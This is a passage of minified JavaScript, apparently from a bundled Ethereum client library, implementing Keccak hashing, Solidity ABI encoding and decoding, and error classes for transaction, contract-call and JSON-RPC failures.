t=0,e=wo,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],_h.push(2*(5*r+n)),Eh.push((t+1)*(t+2)/2%64);let o=hg;for(let i=0;i<7;i++)e=(e<<wo^(e>>mg)*wg)%gg,e&pg&&(o^=wo<<(wo<<BigInt(i))-wo);Ch.push(o)}const[bg,yg]=ng(Ch,!0),Sf=(t,e,n)=>n>32?og(t,e,n):rg(t,e,n),Af=(t,e,n)=>n>32?ag(t,e,n):ig(t,e,n);function vg(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let a=0;a<10;a++)n[a]=t[a]^t[a+10]^t[a+20]^t[a+30]^t[a+40];for(let a=0;a<10;a+=2){const s=(a+8)%10,c=(a+2)%10,l=n[c],u=n[c+1],p=Sf(l,u,1)^n[s],m=Af(l,u,1)^n[s+1];for(let g=0;g<50;g+=10)t[a+g]^=p,t[a+g+1]^=m}let o=t[2],i=t[3];for(let a=0;a<24;a++){const s=Eh[a],c=Sf(o,i,s),l=Af(o,i,s),u=_h[a];o=t[u],i=t[u+1],t[u]=c,t[u+1]=l}for(let a=0;a<50;a+=10){for(let s=0;s<10;s++)n[s]=t[a+s];for(let s=0;s<10;s++)t[a+s]^=~n[(s+2)%10]&n[(s+4)%10]}t[0]^=bg[r],t[1]^=yg[r]}n.fill(0)}class ed extends dg{constructor(e,n,r,o=!1,i=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=o,this.rounds=i,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,_f(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=cg(this.state)}keccak(){vg(this.state32,this.rounds),this.posOut=0,this.pos=0}update(e){Ef(this);const{blockLen:n,state:r}=this;e=xh(e);const o=e.length;for(let i=0;i<o;){const a=Math.min(n-this.pos,o-i);for(let s=0;s<a;s++)r[this.pos++]^=e[i++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:o}=this;e[r]^=n,n&128&&r===o-1&&this.keccak(),e[o-1]^=128,this.keccak()}writeInto(e){Ef(this,!1),vh(e),this.finish();const n=this.state,{blockLen:r}=this;for(let o=0,i=e.length;o<i;){this.posOut>=r&&this.keccak();const a=Math.min(r-this.posOut,i-o);e.set(n.subarray(this.posOut,this.posOut+a),o),this.posOut+=a,o+=a}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return _f(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(eg(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:o,rounds:i,enableXOF:a}=this;return e||(e=new ed(n,r,o,a,i)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=i,e.suffix=r,e.outputLen=o,e.enableXOF=a,e.destroyed=this.destroyed,e}}const xg=(t,e,n)=>fg(()=>new ed(e,t,n)),_g=xg(1,136,256/8);function xt(t,e){const n=e||"hex",r=_g(_n(t,{strict:!1})?lr(t):t);return n==="bytes"?r:Zn(r)}const Eg=t=>xt(lr(t)),td=t=>Eg(Qm(t));function st(t,e,n,{strict:r}={}){return _n(t,{strict:!1})?Sg(t,e,n,{strict:r}):Cg(t,e,n,{strict:r})}function Sh(t,e){if(typeof e=="number"&&e>0&&e>lt(t)-1)throw new uh({offset:e,position:"start",size:lt(t)})}function Ah(t,e,n){if(typeof e=="number"&&typeof n=="number"&&lt(t)!==n-e)throw new uh({offset:n,position:"end",size:lt(t)})}function Cg(t,e,n,{strict:r}={}){Sh(t,e);const o=t.slice(e,n);return r&&Ah(o,e,n),o}function Sg(t,e,n,{strict:r}={}){Sh(t,e);const o=`0x${t.replace("0x","").slice((e??0)*2,(n??t.length)*2)}`;return r&&Ah(o,e,n),o}function Ra(t,e){if(t.length!==e.length)throw new Fm({expectedLength:t.length,givenLength:e.length});const n=Ag({params:t,values:e}),r=rd(n);return r.length===0?"0x":r}function Ag({params:t,values:e}){const n=[];for(let r=0;r<t.length;r++)n.push(nd({param:t[r],value:e[r]}));return n}function nd({param:t,value:e}){const n=bc(t.type);if(n){const[r,o]=n;return Ig(e,{length:r,param:{...t,type:o}})}if(t.type==="tuple")return Rg(e,{param:t});if(t.type==="address")return Tg(e);if(t.type==="bool")return Og(e);if(t.type.startsWith("uint")||t.type.startsWith("int")){const r=t.type.startsWith("int");return Pg(e,{signed:r})}if(t.type.startsWith("bytes"))return $g(e,{param:t});if(t.type==="string")return Dg(e);throw new Gm(t.type,{docsPath:"/docs/contract/encodeAbiParameters"})}function rd(t){let e=0;for(let i=0;i<t.length;i++){const{dynamic:a,encoded:s}=t[i];a?e+=32:e+=lt(s)}const n=[],r=[];let o=0;for(let i=0;i<t.length;i++){const{dynamic:a,encoded:s}=t[i];a?(n.push(xe(e+o,{size:32})),r.push(s),o+=lt(s)):n.push(s)}return Fn([...n,...r])}function Tg(t){if(!ur(t))throw new ko({address:t});return{dynamic:!1,encoded:or(t.toLowerCase())}}function Ig(t,{length:e,param:n}){const r=e===null;if(!Array.isArray(t))throw new Km(t);if(!r&&t.length!==e)throw new Lm({expectedLength:e,givenLength:t.length,type:`${n.type}[${e}]`});let o=!1;const i=[];for(let a=0;a<t.length;a++){const s=nd({param:n,value:t[a]});s.dynamic&&(o=!0),i.push(s)}if(r||o){const a=rd(i);if(r){const s=xe(i.length,{size:32});return{dynamic:!0,encoded:i.length>0?Fn([s,a]):s}}if(o)return{dynamic:!0,encoded:a}}return{dynamic:!1,encoded:Fn(i.map(({encoded:a})=>a))}}function $g(t,{param:e}){const[,n]=e.type.split("bytes"),r=lt(t);if(!n){let o=t;return r%32!==0&&(o=or(o,{dir:"right",size:Math.ceil((t.length-2)/2/32)*32})),{dynamic:!0,encoded:Fn([or(xe(r,{size:32})),o])}}if(r!==parseInt(n))throw new jm({expectedSize:parseInt(n),value:t});return{dynamic:!1,encoded:or(t,{dir:"right"})}}function Og(t){return{dynamic:!1,encoded:or(fh(t))}}function Pg(t,{signed:e}){return{dynamic:!1,encoded:xe(t,{size:32,signed:e})}}function Dg(t){const e=Yu(t),n=Math.ceil(lt(e)/32),r=[];for(let o=0;o<n;o++)r.push(or(st(e,o*32,(o+1)*32),{dir:"right"}));return{dynamic:!0,encoded:Fn([or(xe(lt(e),{size:32})),...r])}}function Rg(t,{param:e}){let n=!1;const r=[];for(let o=0;o<e.components.length;o++){const i=e.components[o],a=Array.isArray(t)?o:i.name,s=nd({param:i,value:t[a]});r.push(s),s.dynamic&&(n=!0)}return{dynamic:n,encoded:n?rd(r):Fn(r.map(({encoded:o})=>o))}}function bc(t){const e=t.match(/^(.*)\[(\d+)?\]$/);return e?[e[2]?Number(e[2]):null,e[1]]:void 0}const Ng=t=>xt(lr(t)),id=t=>st(Ng(yh(t)),0,4);function Na({abi:t,args:e=[],name:n}){const r=_n(n,{strict:!1}),o=t.filter(a=>r?a.type==="function"?id(a)===n:a.type==="event"?td(a)===n:!1:"name"in a&&a.name===n);if(o.length===0)return;if(o.length===1)return o[0];let i;for(const a of o){if(!("inputs"in a))continue;if(!e||e.length===0){if(!a.inputs||a.inputs.length===0)return a;continue}if(!a.inputs||a.inputs.length===0||a.inputs.length!==e.length)continue;if(e.every((c,l)=>{const u="inputs"in a&&a.inputs[l];return u?tu(c,u):!1})){if(i&&"inputs"in i&&i.inputs){const c=Th(a.inputs,i.inputs,e);if(c)throw new Vm({abiItem:a,type:c[0]},{abiItem:i,type:c[1]})}i=a}}return i||o[0]}function tu(t,e){const n=typeof t,r=e.type;switch(r){case"address":return ur(t);case"bool":return n==="boolean";case"function":return n==="string";case"string":return n==="string";default:return r==="tuple"&&"components"in e?Object.values(e.components).every((o,i)=>tu(Object.values(t)[i],o)):/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(r)?n==="number"||n==="bigint":/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(r)?n==="string"||t instanceof Uint8Array:/[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(r)?Array.isArray(t)&&t.every(o=>tu(o,{...e,type:r.replace(/(\[[0-9]{0,}\])$/,"")})):!1}}function Th(t,e,n){for(const r in t){const o=t[r],i=e[r];if(o.type==="tuple"&&i.type==="tuple"&&"components"in o&&"components"in i)return Th(o.components,i.components,n[r]);const a=[o.type,i.type];if(a.includes("address")&&a.includes("bytes20")?!0:a.includes("address")&&a.includes("string")||a.includes("address")&&a.includes("bytes")?ur(n[r]):!1)return a}}function ka({abi:t,eventName:e,args:n}){var s;let r=t[0];if(e&&(r=Na({abi:t,args:n,name:e}),!r))throw new xf(e,{docsPath:"/docs/contract/encodeEventTopics"});if(r.type!=="event")throw new xf(void 0,{docsPath:"/docs/contract/encodeEventTopics"});const o=Wn(r),i=td(o);let a=[];if(n&&"inputs"in r){const c=(s=r.inputs)==null?void 0:s.filter(u=>"indexed"in u&&u.indexed),l=Array.isArray(n)?n:Object.values(n).length>0?(c==null?void 0:c.map(u=>n[u.name]))??[]:[];l.length>0&&(a=(c==null?void 0:c.map((u,p)=>Array.isArray(l[p])?l[p].map((m,g)=>Tf({param:u,value:l[p][g]})):l[p]?Tf({param:u,value:l[p]}):null))??[])}return[i,...a]}function Tf({param:t,value:e}){if(t.type==="string"||t.type==="bytes")return xt(lr(e));if(t.type==="tuple"||t.type.match(/^(.*)\[(\d+)?\]$/))throw new Jm(t.type);return Ra([t],[e])}function yc(t,{method:e}){var r,o;const n={};return t.transport.type==="fallback"&&((o=(r=t.transport).onResponse)==null||o.call(r,({method:i,response:a,status:s,transport:c})=>{s==="success"&&e===i&&(n[a]=c.request)})),i=>n[i]||t.request}async function Ih(t,{address:e,abi:n,args:r,eventName:o,fromBlock:i,strict:a,toBlock:s}){const c=yc(t,{method:"eth_newFilter"}),l=o?ka({abi:n,args:r,eventName:o}):void 0,u=await t.request({method:"eth_newFilter",params:[{address:e,fromBlock:typeof i=="bigint"?xe(i):i,toBlock:typeof s=="bigint"?xe(s):s,topics:l}]});return{abi:n,args:r,eventName:o,id:u,request:c(u),strict:a,type:"event"}}function Kt(t){return typeof t=="string"?{address:t,type:"json-rpc"}:t}function xr({abi:t,args:e,functionName:n}){let r=t[0];if(n&&(r=Na({abi:t,args:e,name:n}),!r))throw new Ss(n,{docsPath:"/docs/contract/encodeFunctionData"});if(r.type!=="function")throw new Ss(void 0,{docsPath:"/docs/contract/encodeFunctionData"});const o=Wn(r),i=id(o),a="inputs"in r&&r.inputs?Ra(r.inputs,e??[]):void 0;return Xu([i,a??"0x"])}const $h={1:"An `assert` condition failed.",17:"Arithmic operation resulted in underflow or overflow.",18:"Division or modulo by zero (e.g. `5 / 0` or `23 % 0`).",33:"Attempted to convert to an invalid type.",34:"Attempted to access a storage byte array that is incorrectly encoded.",49:"Performed `.pop()` on an empty array",50:"Array index is out of bounds.",65:"Allocated too much memory or created an array which is too large.",81:"Attempted to call a zero-initialized variable of internal function type."},kg={inputs:[{name:"message",type:"string"}],name:"Error",type:"error"},Mg={inputs:[{name:"reason",type:"uint256"}],name:"Panic",type:"error"};function od(t,e){const n=e?`${e}${t.toLowerCase()}`:t.substring(2).toLowerCase(),r=xt(Ln(n),"bytes"),o=(e?n.substring(`${e}0x`.length):n).split("");for(let i=0;i<40;i+=2)r[i>>1]>>4>=8&&o[i]&&(o[i]=o[i].toUpperCase()),(r[i>>1]&15)>=8&&o[i+1]&&(o[i+1]=o[i+1].toUpperCase());return`0x${o.join("")}`}function Vt(t,e){if(!ur(t))throw new ko({address:t});return od(t,e)}function vc(t,e){if(e==="0x"&&t.length>0)throw new wc;if(lt(e)&&lt(e)<32)throw new Qu({data:e,params:t,size:lt(e)});return Ug({data:e,params:t})}function Ug({data:t,params:e}){const n=[];let r=0;for(let o=0;o<e.length;o++){if(r>=lt(t))throw new Qu({data:t,params:e,size:lt(t)});const i=e[o],{consumed:a,value:s}=Ii({data:t,param:i,position:r});n.push(s),r+=a}return n}function Ii({data:t,param:e,position:n}){const r=bc(e.type);if(r){const[i,a]=r;return Lg(t,{length:i,param:{...e,type:a},position:n})}if(e.type==="tuple")return Hg(t,{param:e,position:n});if(e.type==="string")return zg(t,{position:n});if(e.type.startsWith("bytes"))return Fg(t,{param:e,position:n});const o=st(t,n,n+32,{strict:!0});if(e.type.startsWith("uint")||e.type.startsWith("int"))return Wg(o,{param:e});if(e.type==="address")return Bg(o);if(e.type==="bool")return jg(o);throw new qm(e.type,{docsPath:"/docs/contract/decodeAbiParameters"})}function Bg(t){return{consumed:32,value:od(st(t,-20))}}function Lg(t,{param:e,length:n,position:r}){if(!n){const a=wt(st(t,r,r+32,{strict:!0})),s=wt(st(t,a,a+32,{strict:!0}));let c=0;const l=[];for(let u=0;u<s;++u){const p=Ii({data:st(t,a+32),param:e,position:c});c+=p.consumed,l.push(p.value)}return{value:l,consumed:32}}if(As(e)){const a=bc(e.type),s=!(a!=null&&a[0]);let c=0;const l=[];for(let u=0;u<n;++u){const p=wt(st(t,r,r+32,{strict:!0})),m=Ii({data:st(t,p),param:e,position:s?c:u*32});c+=m.consumed,l.push(m.value)}return{value:l,consumed:32}}let o=0;const i=[];for(let a=0;a<n;++a){const s=Ii({data:t,param:e,position:r+o});o+=s.consumed,i.push(s.value)}return{value:i,consumed:o}}function jg(t){return{consumed:32,value:Cm(t)}}function Fg(t,{param:e,position:n}){const[r,o]=e.type.split("bytes");if(!o){const a=wt(st(t,n,n+32,{strict:!0})),s=wt(st(t,a,a+32,{strict:!0}));return s===0?{consumed:32,value:"0x"}:{consumed:32,value:st(t,a+32,a+32+s,{strict:!0})}}return{consumed:32,value:st(t,n,n+parseInt(o),{strict:!0})}}function Wg(t,{param:e}){const n=e.type.startsWith("int");return{consumed:32,value:parseInt(e.type.split("int")[1]||"256")>48?hc(t,{signed:n}):wt(t,{signed:n})}}function zg(t,{position:e}){const n=wt(st(t,e,e+32,{strict:!0})),r=wt(st(t,n,n+32,{strict:!0}));return r===0?{consumed:32,value:""}:{consumed:32,value:hh(jr(st(t,n+32,n+32+r,{strict:!0})))}}function Hg(t,{param:e,position:n}){const r=e.components.length===0||e.components.some(({name:a})=>!a),o=r?[]:{};let i=0;if(As(e)){const a=wt(st(t,n,n+32,{strict:!0}));for(let s=0;s<e.components.length;++s){const c=e.components[s],l=Ii({data:st(t,a),param:c,position:i});i+=l.consumed,o[r?s:c==null?void 0:c.name]=l.value}return{consumed:32,value:o}}for(let a=0;a<e.components.length;++a){const s=e.components[a],c=Ii({data:t,param:s,position:n+i});i+=c.consumed,o[r?a:s==null?void 0:s.name]=c.value}return{consumed:i,value:o}}function As(t){var r;const{type:e}=t;if(e==="string"||e==="bytes"||e.endsWith("[]"))return!0;if(e==="tuple")return(r=t.components)==null?void 0:r.some(As);const n=bc(t.type);return!!(n&&As({...t,type:n[1]}))}function Vg({abi:t,data:e}){const n=st(e,0,4);if(n==="0x")throw new wc;const o=[...t||[],kg,Mg].find(i=>i.type==="error"&&n===id(Wn(i)));if(!o)throw new bh(n,{docsPath:"/docs/contract/decodeErrorResult"});return{abiItem:o,args:"inputs"in o&&o.inputs&&o.inputs.length>0?vc(o.inputs,st(e,4)):void 0,errorName:o.name}}const Et=(t,e,n)=>JSON.stringify(t,(r,o)=>{const i=typeof o=="bigint"?o.toString():o;return typeof e=="function"?e(r,i):i},n);function Oh({abiItem:t,args:e,includeFunctionName:n=!0,includeName:r=!1}){if("name"in t&&"inputs"in t&&t.inputs)return`${n?t.name:""}(${t.inputs.map((o,i)=>`${r&&o.name?`${o.name}: `:""}${typeof e[i]=="object"?Et(e[i]):e[i]}`).join(", ")})`}function ad(t,e="wei"){return _s(t,Om[e])}function Ma(t){const e=Object.entries(t).map(([r,o])=>o===void 0||o===!1?null:[r,o]).filter(Boolean),n=e.reduce((r,[o])=>Math.max(r,o.length),0);return e.map(([r,o])=>`  ${`${r}:`.padEnd(n+1)}  ${o}`).join(`
`)}class Zg extends G{constructor(){super(["Cannot specify both a `gasPrice` and a `maxFeePerGas`/`maxPriorityFeePerGas`.","Use `maxFeePerGas`/`maxPriorityFeePerGas` for EIP-1559 compatible networks, and `gasPrice` for others."].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"FeeConflictError"})}}class Gg extends G{constructor({transaction:e}){super("Cannot infer a transaction type from provided transaction.",{metaMessages:["Provided Transaction:","{",Ma(e),"}","","To infer the type, either provide:","- a `type` to the Transaction, or","- an EIP-1559 Transaction with `maxFeePerGas`, or","- an EIP-2930 Transaction with `gasPrice` & `accessList`, or","- a Legacy Transaction with `gasPrice`"]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidSerializableTransactionError"})}}class qg extends G{constructor(e,{account:n,docsPath:r,chain:o,data:i,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m}){var w;const g=Ma({chain:o&&`${o==null?void 0:o.name} (id: ${o==null?void 0:o.id})`,from:n==null?void 0:n.address,to:p,value:typeof m<"u"&&`${ad(m)} ${((w=o==null?void 0:o.nativeCurrency)==null?void 0:w.symbol)||"ETH"}`,data:i,gas:a,gasPrice:typeof s<"u"&&`${Ot(s)} gwei`,maxFeePerGas:typeof c<"u"&&`${Ot(c)} gwei`,maxPriorityFeePerGas:typeof l<"u"&&`${Ot(l)} gwei`,nonce:u});super(e.shortMessage,{cause:e,docsPath:r,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Request Arguments:",g].filter(Boolean)}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TransactionExecutionError"}),this.cause=e}}class Ph extends G{constructor({blockHash:e,blockNumber:n,blockTag:r,hash:o,index:i}){let a="Transaction";r&&i!==void 0&&(a=`Transaction at block time "${r}" at index "${i}"`),e&&i!==void 0&&(a=`Transaction at block hash "${e}" at index "${i}"`),n&&i!==void 0&&(a=`Transaction at block number "${n}" at index "${i}"`),o&&(a=`Transaction with hash "${o}"`),super(`${a} could not be found.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TransactionNotFoundError"})}}class Dh extends G{constructor({hash:e}){super(`Transaction receipt with hash "${e}" could not be found. The Transaction may not be processed on a block yet.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TransactionReceiptNotFoundError"})}}class Kg extends G{constructor({hash:e}){super(`Timed out while waiting for transaction with hash "${e}" to be confirmed.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"WaitForTransactionReceiptTimeoutError"})}}class Rh extends G{constructor(e,{account:n,docsPath:r,chain:o,data:i,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m}){var v;const g=n?Kt(n):void 0,w=Ma({from:g==null?void 0:g.address,to:p,value:typeof m<"u"&&`${ad(m)} ${((v=o==null?void 0:o.nativeCurrency)==null?void 0:v.symbol)||"ETH"}`,data:i,gas:a,gasPrice:typeof s<"u"&&`${Ot(s)} gwei`,maxFeePerGas:typeof c<"u"&&`${Ot(c)} gwei`,maxPriorityFeePerGas:typeof l<"u"&&`${Ot(l)} gwei`,nonce:u});super(e.shortMessage,{cause:e,docsPath:r,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Raw Call Arguments:",w].filter(Boolean)}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"CallExecutionError"}),this.cause=e}}class sd extends G{constructor(e,{abi:n,args:r,contractAddress:o,docsPath:i,functionName:a,sender:s}){const c=Na({abi:n,args:r,name:a}),l=c?Oh({abiItem:c,args:r,includeFunctionName:!1,includeName:!1}):void 0,u=c?Wn(c,{includeName:!0}):void 0,p=Ma({address:o&&hm(o),function:u,args:l&&l!=="()"&&`${[...Array((a==null?void 0:a.length)??0).keys()].map(()=>" ").join("")}${l}`,sender:s});super(e.shortMessage||`An unknown error occurred while executing the contract function "${a}".`,{cause:e,docsPath:i,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Contract Call:",p].filter(Boolean)}),Object.defineProperty(this,"abi",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"args",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"contractAddress",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"formattedArgs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"functionName",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"sender",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ContractFunctionExecutionError"}),this.abi=n,this.args=r,this.cause=e,this.contractAddress=o,this.functionName=a,this.sender=s}}class nu extends G{constructor({abi:e,data:n,functionName:r,message:o}){let i,a,s,c;if(n&&n!=="0x")try{a=Vg({abi:e,data:n});const{abiItem:u,errorName:p,args:m}=a;if(p==="Error")c=m[0];else if(p==="Panic"){const[g]=m;c=$h[g]}else{const g=u?Wn(u,{includeName:!0}):void 0,w=u&&m?Oh({abiItem:u,args:m,includeFunctionName:!1,includeName:!1}):void 0;s=[g?`Error: ${g}`:"",w&&w!=="()"?`       ${[...Array((p==null?void 0:p.length)??0).keys()].map(()=>" ").join("")}${w}`:""]}}catch(u){i=u}else o&&(c=o);let l;i instanceof bh&&(l=i.signature,s=[`Unable to decode signature "${l}" as it was not found on the provided ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${l}.`]),super(c&&c!=="execution reverted"||l?[`The contract function "${r}" reverted with the following ${l?"signature":"reason"}:`,c||l].join(`
`):`The contract function "${r}" reverted.`,{cause:i,metaMessages:s}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ContractFunctionRevertedError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"reason",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=a,this.reason=c,this.signature=l}}class Yg extends G{constructor({functionName:e}){super(`The contract function "${e}" returned no data ("0x").`,{metaMessages:["This could be due to any of the following:",`  - The contract does not have the function "${e}",`,"  - The parameters passed to the contract function may be invalid, or","  - The address is not a contract."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ContractFunctionZeroDataError"})}}class cd extends G{constructor({data:e,message:n}){super(n||""),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:3}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"RawContractError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=e}}class To extends G{constructor({body:e,details:n,headers:r,status:o,url:i}){super("HTTP request failed.",{details:n,metaMessages:[o&&`Status: ${o}`,`URL: ${fc(i)}`,e&&`Request body: ${Et(e)}`].filter(Boolean)}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=e,this.headers=r,this.status=o,this.url=i}}class Jg extends G{constructor({body:e,details:n,url:r}){super("WebSocket request failed.",{details:n,metaMessages:[`URL: ${fc(r)}`,`Request body: ${Et(e)}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"WebSocketRequestError"})}}class ld extends G{constructor({body:e,error:n,url:r}){super("RPC Request failed.",{cause:n,details:n.message,metaMessages:[`URL: ${fc(r)}`,`Request body: ${Et(e)}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=n.code}}class ru extends G{constructor({body:e,url:n}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${fc(n)}`,`Request body: ${Et(e)}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TimeoutError"})}}const Xg=-1;class Rt extends G{constructor(e,{code:n,docsPath:r,metaMessages:o,shortMessage:i}){super(i,{cause:e,docsPath:r,metaMessages:o||(e==null?void 0:e.metaMessages)}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=e.name,this.code=e instanceof ld?e.code:n??Xg}}class oo extends Rt{constructor(e,n){super(e,n),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ProviderRpcError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=n.data}}class Mo extends Rt{constructor(e){super(e,{code:Mo.code,shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ParseRpcError"})}}Object.defineProperty(Mo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class Uo extends Rt{constructor(e){super(e,{code:Uo.code,shortMessage:"JSON is not a valid request object."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidRequestRpcError"})}}Object.defineProperty(Uo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class Bo extends Rt{constructor(e){super(e,{code:Bo.code,shortMessage:"The method does not exist / is not available."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"MethodNotFoundRpcError"})}}Object.defineProperty(Bo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class Lo extends Rt{constructor(e){super(e,{code:Lo.code,shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidParamsRpcError"})}}Object.defineProperty(Lo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class Ri extends Rt{constructor(e){super(e,{code:Ri.code,shortMessage:"An internal error was received."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InternalRpcError"})}}Object.defineProperty(Ri,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class Vr extends Rt{constructor(e){super(e,{code:Vr.code,shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidInputRpcError"})}}Object.defineProperty(Vr,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class jo extends Rt{constructor(e){super(e,{code:jo.code,shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}Object.defineProperty(jo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class Ni extends Rt{constructor(e){super(e,{code:Ni.code,shortMessage:"Requested resource not available."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceUnavailableRpcError"})}}Object.defineProperty(Ni,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class Fo extends Rt{constructor(e){super(e,{code:Fo.code,shortMessage:"Transaction creation failed."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TransactionRejectedRpcError"})}}Object.defineProperty(Fo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class Wo extends Rt{constructor(e){super(e,{code:Wo.code,shortMessage:"Method is not implemented."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"MethodNotSupportedRpcError"})}}Object.defineProperty(Wo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class zo extends Rt{constructor(e){super(e,{code:zo.code,shortMessage:"Request exceeds defined limit."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"LimitExceededRpcError"})}}Object.defineProperty(zo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class Ho extends Rt{constructor(e){super(e,{code:Ho.code,shortMessage:"Version of JSON-RPC protocol is not supported."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"JsonRpcVersionUnsupportedError"})}}Object.defineProperty(Ho,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class $t extends oo{constructor(e){super(e,{code:$t.code,shortMessage:"User rejected the request."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UserRejectedRequestError"})}}Object.defineProperty($t,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class Vo extends 